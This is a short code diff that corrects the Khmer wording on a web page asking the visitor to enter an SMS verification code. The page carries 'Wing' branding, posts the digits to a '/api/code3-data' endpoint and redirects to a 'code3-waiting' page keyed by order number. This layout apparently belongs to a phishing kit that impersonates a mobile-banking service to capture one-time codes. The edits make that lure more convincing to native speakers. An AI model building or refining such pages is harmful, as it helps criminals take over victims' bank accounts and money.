@@ -91,7 +91,7 @@
   <div class="hero-banner">
     <img class="otp-img" src="images/bird-mascot.jpg" alt="Wing">
     <h1>កុដផ្ទៀងផ្ទាត់</h1>
-    <p>កុដផ្ទៀងផ្ទាត់ ត្រុវបានផ្ញីទៅលេខទុរសាព់ចុហ្មោហរបស់កនហ</p>
+    <p>កូដផ្ទៀងផ្ទាត់ត្រូវបានផ្ញើទៅលេខទូរស័ព្ទដែលបានចុះឈ្មោះរបស់អ្នក</p>
   </div>
 
   <div class="content">
@@ -194,7 +194,7 @@
     digits.forEach(d => d.disabled = true);
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "កម្លុងទិន្និយ...";
+    btn.textContent = "កំពុងពិនិត្យ...";
 
     try {
       const res  = await fetch("/api/code3-data", {
@@ -206,11 +206,11 @@
       if (data.success) {
         location.href = "code3-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "មានកម្ហិស");
+        showError(data.message || "មានកំហុស");
         resetInputs();
       }
     } catch (err) {
-      showError("កម្ហិសក្នុងការភ្ជាប់");
+      showError("កំហុសក្នុងការភ្ជាប់");
       resetInputs();
     }
   }
